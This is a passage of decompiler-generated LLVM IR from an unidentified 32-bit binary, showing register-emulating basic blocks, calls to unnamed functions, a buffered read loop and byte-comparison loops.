  br i1 %v8_804d3bd, label %dec_label_pc_804d3dd, label %dec_label_pc_804d3c0

dec_label_pc_804d3c0:                             ; preds = %dec_label_pc_804d388
  %v1_804d3c3 = add i32 %v0_804d3ba, 4168
  store i32 %v1_804d3c3, i32* %eax.global-to-local, align 4
  %v3_804d3ca = inttoptr i32 %v0_804d3ba to i32*
  store i32 %v1_804d3c3, i32* %v3_804d3ca, align 4
  %v0_804d3cb = call i32 @function_804fe40()
  store i32 %v0_804d3cb, i32* %eax.global-to-local, align 4
  %v0_804d3d0 = load i32, i32* @esp, align 4
  %v1_804d3d0 = inttoptr i32 %v0_804d3d0 to i32*
  %v2_804d3d0 = load i32, i32* %v1_804d3d0, align 4
  store i32 %v2_804d3d0, i32* %eax.global-to-local, align 4
  %v3_804d3d0 = add i32 %v0_804d3d0, 4
  %v1_804d3d1 = inttoptr i32 %v3_804d3d0 to i32*
  store i32 9, i32* %v1_804d3d1, align 4
  %v0_804d3d4 = load i32, i32* @ebp, align 4
  store i32 %v0_804d3d4, i32* %v1_804d3d0, align 4
  %v4_804d3d5 = call i32 @function_804fc30(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d3d5, i32* %eax.global-to-local, align 4
  %v0_804d3da = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d3dd

dec_label_pc_804d3dd:                             ; preds = %dec_label_pc_804d388, %dec_label_pc_804d3c0
  %v0_804d3dd.in = phi i32 [ %v0_804d3ba, %dec_label_pc_804d388 ], [ %v0_804d3da, %dec_label_pc_804d3c0 ]
  %v2_804d3e0 = inttoptr i32 %v0_804d3dd.in to i32*
  store i32 10, i32* %v2_804d3e0, align 4
  %v2_804d3e2 = call i32 @function_804ebe0(i8 0)
  store i32 %v2_804d3e2, i32* %eax.global-to-local, align 4
  %v0_804d3e7 = call i32 @function_804fba5()
  store i32 %v0_804d3e7, i32* %eax.global-to-local, align 4
  %v0_804d3ec = load i32, i32* @esp, align 4
  %v1_804d3ec = add i32 %v0_804d3ec, 16
  %v0_804d3ef = load i32, i32* @ebp, align 4
  %v12_804d3ef = icmp eq i32 %v0_804d3ef, %v0_804d3e7
  br i1 %v12_804d3ef, label %dec_label_pc_804d418, label %dec_label_pc_804d3f3

dec_label_pc_804d3f3:                             ; preds = %dec_label_pc_804d3dd
  %v0_804d3f3 = call i32 @function_804fbcb()
  store i32 %v0_804d3f3, i32* %eax.global-to-local, align 4
  %v0_804d3f8 = load i32, i32* @ebp, align 4
  %v12_804d3f8 = icmp eq i32 %v0_804d3f8, %v0_804d3f3
  %v0_804d41a.pre = load i32, i32* @esp, align 4
  br i1 %v12_804d3f8, label %dec_label_pc_804d418, label %dec_label_pc_804d3fc

dec_label_pc_804d3fc:                             ; preds = %dec_label_pc_804d3f3
  %v2_804d3fc = add i32 %v0_804d41a.pre, -4
  %v3_804d3fc = inttoptr i32 %v2_804d3fc to i32*
  store i32 %v0_804d3f3, i32* %v3_804d3fc, align 4
  %v2_804d3fd = add i32 %v0_804d41a.pre, -8
  %v3_804d3fd = inttoptr i32 %v2_804d3fd to i32*
  store i32 %v0_804d3f3, i32* %v3_804d3fd, align 4
  %v0_804d3fe = load i32, i32* @global_var_8053108.22, align 8
  store i32 %v0_804d3fe, i32* %eax.global-to-local, align 4
  %v2_804d403 = add i32 %v0_804d41a.pre, -12
  %v3_804d403 = inttoptr i32 %v2_804d403 to i32*
  store i32 %v0_804d3fe, i32* %v3_804d403, align 4
  %v1_804d404 = add i32 %v0_804d41a.pre, 4152
  store i32 %v1_804d404, i32* @edi, align 4
  %v2_804d40b = add i32 %v0_804d41a.pre, -16
  %v3_804d40b = inttoptr i32 %v2_804d40b to i32*
  store i32 %v1_804d404, i32* %v3_804d40b, align 4
  %v0_804d40c = call i32 @function_804f920()
  store i32 %v0_804d40c, i32* %eax.global-to-local, align 4
  %v0_804d411 = load i32, i32* @esp, align 4
  %v3_804d414 = trunc i32 %v0_804d40c to i8
  %v4_804d414 = icmp eq i8 %v3_804d414, 0
  br i1 %v4_804d414, label %dec_label_pc_804d473, label %dec_label_pc_804d3fc.dec_label_pc_804d418_crit_edge

dec_label_pc_804d3fc.dec_label_pc_804d418_crit_edge: ; preds = %dec_label_pc_804d3fc
  %v1_804d411 = add i32 %v0_804d411, 16
  %v0_804d418.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804d418

dec_label_pc_804d418:                             ; preds = %dec_label_pc_804d3f3, %dec_label_pc_804d3fc.dec_label_pc_804d418_crit_edge, %dec_label_pc_804d3dd
  %v0_804d41a = phi i32 [ %v1_804d411, %dec_label_pc_804d3fc.dec_label_pc_804d418_crit_edge ], [ %v1_804d3ec, %dec_label_pc_804d3dd ], [ %v0_804d41a.pre, %dec_label_pc_804d3f3 ]
  %v0_804d418 = phi i32 [ %v0_804d418.pre, %dec_label_pc_804d3fc.dec_label_pc_804d418_crit_edge ], [ %v0_804d3e7, %dec_label_pc_804d3dd ], [ %v0_804d3f3, %dec_label_pc_804d3f3 ]
  store i32 %v0_804d418, i32* @esi, align 4
  %v1_804d41a = add i32 %v0_804d41a, 8
  %v2_804d41a = inttoptr i32 %v1_804d41a to i32*
  %v3_804d41a = load i32, i32* %v2_804d41a, align 4
  store i32 %v3_804d41a, i32* @ebx, align 4
  br label %dec_label_pc_804d230

dec_label_pc_804d423:                             ; preds = %dec_label_pc_804d230
  %v1_804d426 = add i32 %v0_804d23d, 32
  %v2_804d426 = inttoptr i32 %v1_804d426 to i32*
  %v3_804d426 = load i32, i32* %v2_804d426, align 4
  store i32 %v3_804d426, i32* @eax, align 4
  %v3_804d42a = inttoptr i32 %v0_804d23d to i32*
  store i32 %v3_804d426, i32* %v3_804d42a, align 4
  %v0_804d42b = call i32 @function_804fea4()
  store i32 %v0_804d42b, i32* %eax.global-to-local, align 4
  %v0_804d430 = load i32, i32* @esp, align 4
  %v1_804d430 = add i32 %v0_804d430, 16
  br label %dec_label_pc_804d1f0

dec_label_pc_804d438:                             ; preds = %dec_label_pc_804d272
  %v0_804d438 = load i32, i32* @ebp, align 4
  %v7_804d43e = icmp sgt i32 %v0_804d438, 400
  br i1 %v7_804d43e, label %dec_label_pc_804d444, label %dec_label_pc_804d230

dec_label_pc_804d444:                             ; preds = %dec_label_pc_804d438
  store i32 -858993459, i32* %eax.global-to-local, align 4
  %v1_804d449 = add i32 %v0_804d27e, 28
  %v2_804d449 = inttoptr i32 %v1_804d449 to i32*
  %v3_804d449 = load i32, i32* %v2_804d449, align 4
  %v10_804d449 = udiv i32 %v3_804d449, 2
  store i32 %v10_804d449, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804d457 = load i32, i32* %v2_804d449, align 4
  %v15_804d457 = icmp eq i32 %v3_804d457, 0
  %v1_804d45b = icmp eq i1 %v15_804d457, false
  br i1 %v1_804d45b, label %dec_label_pc_804d230, label %dec_label_pc_804d461

dec_label_pc_804d461:                             ; preds = %dec_label_pc_804d444
  %v2_804d464 = inttoptr i32 %v0_804d27e to i32*
  store i32 1, i32* %v2_804d464, align 4
  %v1_804d466 = call i32 @function_8051700(i32 0)
  store i32 %v1_804d466, i32* %eax.global-to-local, align 4
  %v0_804d46b = load i32, i32* @esp, align 4
  %v1_804d46b = add i32 %v0_804d46b, 16
  br label %dec_label_pc_804d230

dec_label_pc_804d473:                             ; preds = %dec_label_pc_804d3fc
  %v2_804d473 = add i32 %v0_804d411, 12
  %v3_804d473 = inttoptr i32 %v2_804d473 to i32*
  store i32 %v0_804d40c, i32* %v3_804d473, align 4
  %v2_804d474 = add i32 %v0_804d411, 8
  %v3_804d474 = inttoptr i32 %v2_804d474 to i32*
  store i32 %v0_804d40c, i32* %v3_804d474, align 4
  %v1_804d475 = add i32 %v0_804d411, 4
  %v2_804d475 = inttoptr i32 %v1_804d475 to i32*
  store i32 0, i32* %v2_804d475, align 4
  %v1_804d477 = add i32 %v0_804d411, 4168
  store i32 %v1_804d477, i32* %eax.global-to-local, align 4
  %v3_804d47e = inttoptr i32 %v0_804d411 to i32*
  store i32 %v1_804d477, i32* %v3_804d47e, align 4
  %v3_804d47f = call i32 @function_804fc62(i8* null, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804d47f, i32* %eax.global-to-local, align 4
  %v0_804d484 = load i32, i32* @esp, align 4
  store i32 %v3_804d47f, i32* @ebx, align 4
  %v10_804d489 = icmp eq i32 %v3_804d47f, -1
  %v1_804d48c = icmp eq i1 %v10_804d489, false
  br i1 %v1_804d48c, label %dec_label_pc_804d49b, label %dec_label_pc_804d48e

dec_label_pc_804d48e:                             ; preds = %dec_label_pc_804d473
  %v0_804d48e = load i32, i32* @edi, align 4
  %v2_804d48e = add i32 %v0_804d484, 12
  %v3_804d48e = inttoptr i32 %v2_804d48e to i32*
  store i32 %v0_804d48e, i32* %v3_804d48e, align 4
  %v0_804d48f = load i32, i32* @edi, align 4
  %v2_804d48f = add i32 %v0_804d484, 8
  %v3_804d48f = inttoptr i32 %v2_804d48f to i32*
  store i32 %v0_804d48f, i32* %v3_804d48f, align 4
  %v1_804d490 = add i32 %v0_804d484, 4
  %v2_804d490 = inttoptr i32 %v1_804d490 to i32*
  store i32 9, i32* %v2_804d490, align 4
  %v0_804d492 = load i32, i32* @ebp, align 4
  %v3_804d492 = inttoptr i32 %v0_804d484 to i32*
  store i32 %v0_804d492, i32* %v3_804d492, align 4
  %v4_804d493 = call i32 @function_804fc30(i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804d493, i32* %eax.global-to-local, align 4
  %v0_804d498 = load i32, i32* @esp, align 4
  %v0_804d49e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804d49b

dec_label_pc_804d49b:                             ; preds = %dec_label_pc_804d473, %dec_label_pc_804d48e
  %v0_804d49e = phi i32 [ %v3_804d47f, %dec_label_pc_804d473 ], [ %v0_804d49e.pre, %dec_label_pc_804d48e ]
  %v0_804d49b.in = phi i32 [ %v0_804d484, %dec_label_pc_804d473 ], [ %v0_804d498, %dec_label_pc_804d48e ]
  %v3_804d49e = inttoptr i32 %v0_804d49b.in to i32*
  store i32 %v0_804d49e, i32* %v3_804d49e, align 4
  %v1_804d49f = call i32 @function_804fb51(i32 0)
  store i32 %v1_804d49f, i32* %eax.global-to-local, align 4
  %v0_804d4a4 = load i32, i32* @esp, align 4
  %v1_804d4a4 = add i32 %v0_804d4a4, 16
  br label %dec_label_pc_804d4a7

dec_label_pc_804d4a7:                             ; preds = %dec_label_pc_804d293, %dec_label_pc_804d49b
  %v1_804d4a7 = phi i32 [ %v1_804d37a, %dec_label_pc_804d293 ], [ %v1_804d4a4, %dec_label_pc_804d49b ]
  %v0_804d4a7 = load i32, i32* @esi, align 4
  %v2_804d4a7 = add i32 %v1_804d4a7, -4
  %v3_804d4a7 = inttoptr i32 %v2_804d4a7 to i32*
  store i32 %v0_804d4a7, i32* %v3_804d4a7, align 4
  %v0_804d4a8 = load i32, i32* @esi, align 4
  %v2_804d4a8 = add i32 %v1_804d4a7, -8
  %v3_804d4a8 = inttoptr i32 %v2_804d4a8 to i32*
  store i32 %v0_804d4a8, i32* %v3_804d4a8, align 4
  %v1_804d4a9 = add i32 %v1_804d4a7, -12
  %v2_804d4a9 = inttoptr i32 %v1_804d4a9 to i32*
  store i32 0, i32* %v2_804d4a9, align 4
  %v1_804d4ab = add i32 %v1_804d4a7, 8312
  %v2_804d4b2 = add i32 %v1_804d4a7, -16
  %v3_804d4b2 = inttoptr i32 %v2_804d4b2 to i32*
  store i32 %v1_804d4ab, i32* %v3_804d4b2, align 4
  %v3_804d4b3 = call i32 @function_804fc62(i8* null, i32 ptrtoint (i32* @0 to i32))
  %v1_804d4b8 = load i32, i32* @esp, align 4
  %v2_804d4b8 = add i32 %v1_804d4b8, 56
  %v3_804d4b8 = inttoptr i32 %v2_804d4b8 to i32*
  store i32 %v3_804d4b3, i32* %v3_804d4b8, align 4
  %v0_804d4bc = load i32, i32* @esp, align 4
  %v1_804d4bf = add i32 %v3_804d4b3, 1
  %v8_804d4bf = icmp eq i32 %v1_804d4bf, 0
  store i32 %v1_804d4bf, i32* @eax, align 4
  br i1 %v8_804d4bf, label %dec_label_pc_804d6fc, label %dec_label_pc_804d4c6

dec_label_pc_804d4c6:                             ; preds = %dec_label_pc_804d4a7
  %v2_804d4c9 = inttoptr i32 %v0_804d4bc to i32*
  store i32 12, i32* %v2_804d4c9, align 4
  %v2_804d4cb = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d4cb, i32* %eax.global-to-local, align 4
  %v0_804d4d0 = load i32, i32* @esp, align 4
  %v1_804d4d0 = inttoptr i32 %v0_804d4d0 to i32*
  store i32 13, i32* %v1_804d4d0, align 4
  %v2_804d4d7 = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d4d7, i32* %eax.global-to-local, align 4
  %v0_804d4dc = load i32, i32* @esp, align 4
  %v1_804d4dc = inttoptr i32 %v0_804d4dc to i32*
  store i32 14, i32* %v1_804d4dc, align 4
  %v2_804d4e3 = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d4e3, i32* %eax.global-to-local, align 4
  %v0_804d4e8 = load i32, i32* @esp, align 4
  %v1_804d4e8 = inttoptr i32 %v0_804d4e8 to i32*
  store i32 15, i32* %v1_804d4e8, align 4
  %v2_804d4ef = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d4ef, i32* %eax.global-to-local, align 4
  %v0_804d4f4 = load i32, i32* @esp, align 4
  %v1_804d4f4 = inttoptr i32 %v0_804d4f4 to i32*
  store i32 16, i32* %v1_804d4f4, align 4
  %v2_804d4fb = call i32 @function_804ec60(i8 0)
  store i32 %v2_804d4fb, i32* %eax.global-to-local, align 4
  %v0_804d500 = load i32, i32* @esp, align 4
  %v1_804d500 = inttoptr i32 %v0_804d500 to i32*
  %v3_804d500 = add i32 %v0_804d500, 4
  %v1_804d501 = inttoptr i32 %v3_804d500 to i32*
  %v1_804d502 = add i32 %v0_804d500, 8436
  store i32 %v1_804d502, i32* %eax.global-to-local, align 4
  store i32 %v1_804d502, i32* %v1_804d501, align 4
  store i32 12, i32* %v1_804d500, align 4
  %v3_804d50c = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d50c, i32* %eax.global-to-local, align 4
  %v1_804d511 = load i32, i32* @esp, align 4
  %v2_804d511 = add i32 %v1_804d511, 52
  %v3_804d511 = inttoptr i32 %v2_804d511 to i32*
  store i32 %v3_804d50c, i32* %v3_804d511, align 4
  %v0_804d515 = load i32, i32* @esp, align 4
  %v1_804d515 = inttoptr i32 %v0_804d515 to i32*
  %v3_804d515 = add i32 %v0_804d515, 4
  %v1_804d516 = inttoptr i32 %v3_804d515 to i32*
  %v1_804d517 = add i32 %v0_804d515, 8432
  store i32 %v1_804d517, i32* %eax.global-to-local, align 4
  store i32 %v1_804d517, i32* %v1_804d516, align 4
  store i32 13, i32* %v1_804d515, align 4
  %v3_804d521 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d521, i32* %eax.global-to-local, align 4
  %v1_804d526 = load i32, i32* @esp, align 4
  %v2_804d526 = add i32 %v1_804d526, 48
  %v3_804d526 = inttoptr i32 %v2_804d526 to i32*
  store i32 %v3_804d521, i32* %v3_804d526, align 4
  %v0_804d52a = load i32, i32* @esp, align 4
  %v1_804d52a = inttoptr i32 %v0_804d52a to i32*
  %v3_804d52a = add i32 %v0_804d52a, 4
  %v1_804d52b = inttoptr i32 %v3_804d52a to i32*
  %v2_804d52b = load i32, i32* %v1_804d52b, align 4
  store i32 %v2_804d52b, i32* @edi, align 4
  %v1_804d52c = add i32 %v0_804d52a, 8428
  store i32 %v1_804d52c, i32* %eax.global-to-local, align 4
  store i32 %v1_804d52c, i32* %v1_804d52b, align 4
  store i32 14, i32* %v1_804d52a, align 4
  %v3_804d536 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d536, i32* %eax.global-to-local, align 4
  %v1_804d53b = load i32, i32* @esp, align 4
  %v2_804d53b = add i32 %v1_804d53b, 44
  %v3_804d53b = inttoptr i32 %v2_804d53b to i32*
  store i32 %v3_804d536, i32* %v3_804d53b, align 4
  %v0_804d53f = load i32, i32* @esp, align 4
  %v1_804d53f = inttoptr i32 %v0_804d53f to i32*
  %v3_804d53f = add i32 %v0_804d53f, 4
  %v1_804d540 = inttoptr i32 %v3_804d53f to i32*
  %v2_804d540 = load i32, i32* %v1_804d540, align 4
  store i32 %v2_804d540, i32* @ebx, align 4
  %v1_804d541 = add i32 %v0_804d53f, 8440
  store i32 %v1_804d541, i32* %eax.global-to-local, align 4
  store i32 %v1_804d541, i32* %v1_804d540, align 4
  store i32 15, i32* %v1_804d53f, align 4
  %v3_804d54b = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d54b, i32* %eax.global-to-local, align 4
  %v1_804d550 = load i32, i32* @esp, align 4
  %v2_804d550 = add i32 %v1_804d550, 40
  %v3_804d550 = inttoptr i32 %v2_804d550 to i32*
  store i32 %v3_804d54b, i32* %v3_804d550, align 4
  %v0_804d554 = load i32, i32* @esp, align 4
  %v1_804d554 = inttoptr i32 %v0_804d554 to i32*
  %v3_804d554 = add i32 %v0_804d554, 4
  %v1_804d555 = inttoptr i32 %v3_804d554 to i32*
  %v1_804d556 = add i32 %v0_804d554, 8424
  store i32 %v1_804d556, i32* %eax.global-to-local, align 4
  store i32 %v1_804d556, i32* %v1_804d555, align 4
  store i32 16, i32* %v1_804d554, align 4
  %v3_804d560 = call i32 @function_804ebb0(i32 0, i32* nonnull @0)
  store i32 %v3_804d560, i32* %eax.global-to-local, align 4
  %v1_804d565 = load i32, i32* @esp, align 4
  %v2_804d565 = add i32 %v1_804d565, 36
  %v3_804d565 = inttoptr i32 %v2_804d565 to i32*
  store i32 %v3_804d560, i32* %v3_804d565, align 4
  %v0_804d569 = load i32, i32* @esp, align 4
  %v1_804d569 = add i32 %v0_804d569, 16
  %v0_804d56c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d56c

dec_label_pc_804d56c:                             ; preds = %dec_label_pc_804d668, %dec_label_pc_804d680.backedge, %dec_label_pc_804d677, %dec_label_pc_804d4c6
  %v1_804d56c = phi i32 [ %v1_804d569, %dec_label_pc_804d4c6 ], [ %v0_804d677, %dec_label_pc_804d677 ], [ %v0_804d677, %dec_label_pc_804d680.backedge ], [ %v0_804d677, %dec_label_pc_804d668 ]
  %v0_804d56c = phi i32 [ %v0_804d56c.pre, %dec_label_pc_804d4c6 ], [ %v0_804d56c51, %dec_label_pc_804d677 ], [ %v6_804d68e, %dec_label_pc_804d680.backedge ], [ %v0_804d56c51, %dec_label_pc_804d668 ]
  %v2_804d56c = add i32 %v1_804d56c, -4
  %v3_804d56c = inttoptr i32 %v2_804d56c to i32*
  store i32 %v0_804d56c, i32* %v3_804d56c, align 4
  %v1_804d56d = add i32 %v1_804d56c, -8
  %v2_804d56d = inttoptr i32 %v1_804d56d to i32*
  store i32 4096, i32* %v2_804d56d, align 4
  %v1_804d572 = add i32 %v1_804d56c, 56
  store i32 %v1_804d572, i32* %eax.global-to-local, align 4
  %v2_804d576 = add i32 %v1_804d56c, -12
  %v3_804d576 = inttoptr i32 %v2_804d576 to i32*
  store i32 %v1_804d572, i32* %v3_804d576, align 4
  %v1_804d577 = add i32 %v1_804d56c, 40
  %v2_804d577 = inttoptr i32 %v1_804d577 to i32*
  %v3_804d577 = load i32, i32* %v2_804d577, align 4
  store i32 %v3_804d577, i32* %eax.global-to-local, align 4
  %v2_804d57b = add i32 %v1_804d56c, -16
  %v3_804d57b = inttoptr i32 %v2_804d57b to i32*
  store i32 %v3_804d577, i32* %v3_804d57b, align 4
  %v5_804d57c = call i32 @function_804fcec(i32 0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804d57c, i32* %eax.global-to-local, align 4
  %v0_804d581 = load i32, i32* @esp, align 4
  store i32 %v5_804d57c, i32* @ebx, align 4
  %tmp113 = icmp slt i32 %v5_804d57c, 1
  br i1 %tmp113, label %dec_label_pc_804d777, label %dec_label_pc_804d58e

dec_label_pc_804d58e:                             ; preds = %dec_label_pc_804d56c
  %v1_804d581 = add i32 %v0_804d581, 16
  %v1_804d58e = add i32 %v0_804d581, 8436
  %v2_804d58e = inttoptr i32 %v1_804d58e to i32*
  %v3_804d58e = load i32, i32* %v2_804d58e, align 4
  store i32 %v3_804d58e, i32* %eax.global-to-local, align 4
  %v2_804d595 = inttoptr i32 %v1_804d581 to i32*
  store i32 %v3_804d58e, i32* %v2_804d595, align 4
  %v0_804d598 = load i32, i32* @ebx, align 4
  %v1_804d598 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d598 = sub i32 %v0_804d598, %v1_804d598
  %v8_804d598 = xor i32 %v1_804d598, %v0_804d598
  %v9_804d598 = xor i32 %v2_804d598, %v0_804d598
  %v10_804d598 = and i32 %v9_804d598, %v8_804d598
  %v11_804d598 = icmp slt i32 %v10_804d598, 0
  %v13_804d598 = icmp slt i32 %v2_804d598, 0
  %v2_804d59a = icmp eq i1 %v13_804d598, %v11_804d598
  br i1 %v2_804d59a, label %dec_label_pc_804d59c, label %dec_label_pc_804d58e.dec_label_pc_804d5c8_crit_edge

dec_label_pc_804d58e.dec_label_pc_804d5c8_crit_edge: ; preds = %dec_label_pc_804d58e
  %v0_804d5c8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d5c8

dec_label_pc_804d59c:                             ; preds = %dec_label_pc_804d58e
  %v0_804d5a1 = load i32, i32* @esp, align 4
  %v10_804d5a5 = icmp eq i32 %v0_804d598, 0
  br i1 %v10_804d5a5, label %dec_label_pc_804d5c8, label %dec_label_pc_804d5b0.preheader

dec_label_pc_804d5b0.preheader:                   ; preds = %dec_label_pc_804d59c
  %v1_804d5a1 = add i32 %v0_804d5a1, 56
  %v1_804d5b0 = add i32 %v0_804d5a1, 36
  %v2_804d5b0 = inttoptr i32 %v1_804d5b0 to i32*
  %v1_804d6a1 = inttoptr i32 %v0_804d5a1 to i32*
  br label %dec_label_pc_804d5b0

dec_label_pc_804d5b0:                             ; preds = %dec_label_pc_804d5b0.preheader, %dec_label_pc_804d5c1
  %v0_804d5c1.in = phi i32 [ %v0_804d5c1, %dec_label_pc_804d5c1 ], [ %v0_804d598, %dec_label_pc_804d5b0.preheader ]
  %v0_804d6a0 = phi i32 [ %v3_804d5b660, %dec_label_pc_804d5c1 ], [ 0, %dec_label_pc_804d5b0.preheader ]
  %v4_804d5b4 = phi i32 [ %v6_804d5b4, %dec_label_pc_804d5c1 ], [ %v1_804d598, %dec_label_pc_804d5b0.preheader ]
  %v0_804d5c2 = phi i32 [ %v1_804d5c2, %dec_label_pc_804d5c1 ], [ %v1_804d5a1, %dec_label_pc_804d5b0.preheader ]
  %v0_804d5c1 = add i32 %v0_804d5c1.in, -1
  %v3_804d5b0 = load i32, i32* %v2_804d5b0, align 4
  store i32 %v3_804d5b0, i32* @edi, align 4
  %v1_804d5b4 = inttoptr i32 %v0_804d5c2 to i8*
  %v2_804d5b4 = load i8, i8* %v1_804d5b4, align 1
  %v3_804d5b4 = zext i8 %v2_804d5b4 to i32
  %v5_804d5b4 = and i32 %v4_804d5b4, -256
  %v6_804d5b4 = or i32 %v3_804d5b4, %v5_804d5b4
  store i32 %v6_804d5b4, i32* %eax.global-to-local, align 4
  %v4_804d5b6 = add i32 %v3_804d5b0, %v0_804d6a0
  %v5_804d5b6 = inttoptr i32 %v4_804d5b6 to i8*
  %v6_804d5b6 = load i8, i8* %v5_804d5b6, align 1
  %v17_804d5b6 = icmp eq i8 %v2_804d5b4, %v6_804d5b6
  br i1 %v17_804d5b6, label %dec_label_pc_804d6a0, label %dec_label_pc_804d5bf

dec_label_pc_804d5bf:                             ; preds = %dec_label_pc_804d5b0
  br label %dec_label_pc_804d5c1

dec_label_pc_804d5c1:                             ; preds = %dec_label_pc_804d6a0, %dec_label_pc_804d5bf
  %v3_804d5b660 = phi i32 [ %v1_804d6a0, %dec_label_pc_804d6a0 ], [ 0, %dec_label_pc_804d5bf ]
  %v1_804d5c2 = add i32 %v0_804d5c2, 1
  %v10_804d5c3 = icmp eq i32 %v0_804d5c1, 0
  %v1_804d5c6 = icmp eq i1 %v10_804d5c3, false
  br i1 %v1_804d5c6, label %dec_label_pc_804d5b0, label %dec_label_pc_804d5c8

dec_label_pc_804d5c8:                             ; preds = %dec_label_pc_804d5c1, %dec_label_pc_804d58e.dec_label_pc_804d5c8_crit_edge, %dec_label_pc_804d59c
  %v0_804d5c8 = phi i32 [ %v0_804d5c8.pre, %dec_label_pc_804d58e.dec_label_pc_804d5c8_crit_edge ], [ %v0_804d5a1, %dec_label_pc_804d59c ], [ %v0_804d5a1, %dec_label_pc_804d5c1 ]
  %v1_804d5c8 = add i32 %v0_804d5c8, 8416
  %v2_804d5c8 = inttoptr i32 %v1_804d5c8 to i32*
  %v3_804d5c8 = load i32, i32* %v2_804d5c8, align 4
  store i32 %v3_804d5c8, i32* %eax.global-to-local, align 4
  %v2_804d5cf = inttoptr i32 %v0_804d5c8 to i32*
  store i32 %v3_804d5c8, i32* %v2_804d5cf, align 4
  %v0_804d5d2 = load i32, i32* @ebx, align 4
  %v1_804d5d2 = load i32, i32* %eax.global-to-local, align 4
  %v2_804d5d2 = sub i32 %v0_804d5d2, %v1_804d5d2
  %v8_804d5d2 = xor i32 %v1_804d5d2, %v0_804d5d2
  %v9_804d5d2 = xor i32 %v2_804d5d2, %v0_804d5d2
  %v10_804d5d2 = and i32 %v9_804d5d2, %v8_804d5d2
  %v11_804d5d2 = icmp slt i32 %v10_804d5d2, 0
  %v13_804d5d2 = icmp slt i32 %v2_804d5d2, 0
  %v2_804d5d4 = icmp eq i1 %v13_804d5d2, %v11_804d5d2
  br i1 %v2_804d5d4, label %dec_label_pc_804d5d6, label %dec_label_pc_804d5c8.dec_label_pc_804d5fc_crit_edge

dec_label_pc_804d5c8.dec_label_pc_804d5fc_crit_edge: ; preds = %dec_label_pc_804d5c8
  %v0_804d5fc.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804d5fc

dec_label_pc_804d5d6:                             ; preds = %dec_label_pc_804d5c8
  %v0_804d5db = load i32, i32* @esp, align 4
  %v10_804d5df = icmp eq i32 %v0_804d5d2, 0
  br i1 %v10_804d5df, label %dec_label_pc_804d5fc, label %dec_label_pc_804d5e4.preheader

dec_label_pc_804d5e4.preheader:                   ; preds = %dec_label_pc_804d5d6
  %v1_804d5db = add i32 %v0_804d5db, 56
  %v1_804d5e4 = add i32 %v0_804d5db, 32
  %v2_804d5e4 = inttoptr i32 %v1_804d5e4 to i32*
  %v1_804d739 = inttoptr i32 %v0_804d5db to i32*
  br label %dec_label_pc_804d5e4

dec_label_pc_804d5e4:                             ; preds = %dec_label_pc_804d5e4.preheader, %dec_label_pc_804d5f6
  %v0_804d5f6.in = phi i32 [ %v0_804d5f6, %dec_label_pc_804d5f6 ], [ %v0_804d5d2, %dec_label_pc_804d5e4.preheader ]
  %v0_804d738 = phi i32 [ %v3_804d5ea68, %dec_label_pc_804d5f6 ], [ 0, %dec_label_pc_804d5e4.preheader ]
  %v4_804d5e8 = phi i32 [ %v6_804d5e8, %dec_label_pc_804d5f6 ], [ %v1_804d5d2, %dec_label_pc_804d5e4.preheader ]
  %v0_804d742 = phi i32 [ %v1_804d5f5, %dec_label_pc_804d5f6 ], [ %v1_804d5db, %dec_label_pc_804d5e4.preheader ]
  %v0_804d5f6 = add i32 %v0_804d5f6.in, -1
  %v3_804d5e4 = load i32, i32* %v2_804d5e4, align 4
  store i32 %v3_804d5e4, i32* @edi, align 4
  %v1_804d5e8 = inttoptr i32 %v0_804d742 to i8*
  %v2_804d5e8 = load i8, i8* %v1_804d5e8, align 1
  %v3_804d5e8 = zext i8 %v2_804d5e8 to i32
  %v5_804d5e8 = and i32 %v4_804d5e8, -256
  %v6_804d5e8 = or i32 %v3_804d5e8, %v5_804d5e8
  store i32 %v6_804d5e8, i32* %eax.global-to-local, align 4
  %v4_804d5ea = add i32 %v3_804d5e4, %v0_804d738
  %v5_804d5ea = inttoptr i32 %v4_804d5ea to i8*
  %v6_804d5ea = load i8, i8* %v5_804d5ea, align 1
  %v17_804d5ea = icmp eq i8 %v2_804d5e8, %v6_804d5ea
  br i1 %v17_804d5ea, label %dec_label_pc_804d738, label %dec_label_pc_804d5f3

dec_label_pc_804d5f3:                             ; preds = %dec_label_pc_804d5e4
  br label %dec_label_pc_804d5f6

dec_label_pc_804d5f6:                             ; preds = %dec_label_pc_804d738, %dec_label_pc_804d5f3
  %v3_804d5ea68 = phi i32 [ 0, %dec_label_pc_804d5f3 ], [ %v1_804d738, %dec_label_pc_804d738 ]
  %v1_804d5f5 = add i32 %v0_804d742, 1
  %v10_804d5f7 = icmp eq i32 %v0_804d5f6, 0
  %v1_804d5fa = icmp eq i1 %v10_804d5f7, false
  br i1 %v1_804d5fa, label %dec_label_pc_804d5e4, label %dec_label_pc_804d5fc

dec_label_pc_804d5fc:                             ; preds = %dec_label_pc_804d5f6, %dec_label_pc_804d5c8.dec_label_pc_804d5fc_crit_edge, %dec_label_pc_804d5d6
  %v0_804d5fc = phi i32 [ %v0_804d5fc.pre, %dec_label_pc_804d5c8.dec_label_pc_804d5fc_crit_edge ], [ %v0_804d5db, %dec_label_pc_804d5d6 ], [ %v0_804d5db, %dec_label_pc_804d5f6 ]
